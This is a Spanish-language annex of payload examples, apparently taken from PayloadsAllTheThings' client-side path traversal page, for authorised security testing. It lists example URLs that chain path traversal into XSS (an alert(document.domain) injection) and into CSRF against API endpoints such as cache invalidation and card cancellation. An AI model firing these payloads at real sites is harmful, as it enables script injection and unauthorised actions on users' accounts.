# Cross-Site Request Forgery (CSRF): anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Client Side Path Traversal/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Client%20Side%20Path%20Traversal/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Metodología / CSPT to XSS

### Variantes presentes en tablas o texto del apartado

```text
../
https://example.com/static/cms/news.html
https://example.com/newitems/<newsitemid>
https://example.com/pricing/default.js
https://example.com/static/cms/news.html?newsitemid=../pricing/default.js?cb=alert(document.domain)//
```

## 2. Metodología / CSPT to CSRF

### Variantes presentes en tablas o texto del apartado

```text
/<team>/channels/channelname?telem_action=under_control&forceRHSOpen&telem_run_id=../../../../../../api/v4/caches/invalidate
https://example.com/signup/invite?email=foo%40bar.com&inviteCode=123456789/../../../cards/123e4567-e89b-42d3-a456-556642440000/cancel?a=
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
